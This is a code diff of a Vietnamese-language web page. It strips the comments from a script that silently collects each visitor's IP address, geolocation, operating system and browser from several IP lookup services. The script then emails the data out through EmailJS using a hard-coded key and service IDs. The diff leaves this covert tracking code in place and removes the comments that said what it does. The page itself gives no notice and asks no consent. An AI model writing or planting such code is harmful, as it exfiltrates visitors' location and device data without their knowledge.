@@ -9,7 +9,6 @@
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <script type="text/javascript">
         (function() {
-            // THAY 'YOUR_PUBLIC_KEY' BẰNG PUBLIC KEY CỦA BẠN TỪ EMAILJS
             emailjs.init("pCwA9hhW8GdWPLdq_");; 
         })();
     </script>
@@ -314,7 +313,6 @@
 
     <!-- SCRIPT TỰ ĐỘNG THU THẬP VỊ TRÍ TỌA ĐỘ & GỬI EMAIL -->
     <script>
-                // 1. Nhận diện Hệ điều hành
                 function getOS() {
             const ua = navigator.userAgent;
             if (ua.includes("Win")) return "Windows";
@@ -324,8 +322,6 @@
             if (ua.includes("iPhone") || ua.includes("iPad")) return "iOS";
             return "Không xác định";
         }
-
-        // 2. Nhận diện Trình duyệt
         function getBrowser() {
             const ua = navigator.userAgent;
             if (ua.includes("Edg")) return "Microsoft Edge";
@@ -334,10 +330,7 @@
             if (ua.includes("Safari") && !ua.includes("Chrome")) return "Apple Safari";
             return "Trình duyệt khác";
         }
-
-        // 3. Hàm lấy IP & Vị trí đa tầng (Cực kỳ ổn định)
         async function getGeoData() {
-            // Nguồn 1: IPWhois (Tốt nhất cho Browser, không chặn CORS)
             try {
                 const res = await fetch('https://ipwho.is/');
                 const data = await res.json();
@@ -353,8 +346,6 @@
             } catch (e) {
                 console.warn("Nguồn 1 (ipwhois) lỗi, đang thử nguồn 2...");
             }
-
-            // Nguồn 2: IPAPI.co
             try {
                 const res = await fetch('https://ipapi.co/json/');
                 const data = await res.json();
@@ -370,8 +361,6 @@
             } catch (e) {
                 console.warn("Nguồn 2 (ipapi) lỗi, đang thử nguồn 3...");
             }
-
-            // Nguồn 3: IP-API (Dự phòng cuối)
             try {
                 const res = await fetch('https://api.ipify.org?format=json');
                 const data = await res.json();
@@ -411,8 +400,7 @@
                 browser: getBrowser(),
                 time: new Date().toLocaleString('vi-VN')
             };
-
-            // Gửi Email qua EmailJS (Hãy đảm bảo đã khai báo EmailJS ở trên)
+            
             if (typeof emailjs !== 'undefined') {
                 emailjs.send("service_jeq89wa", "template_j9zwes7", {
                     ip: logData.ip,
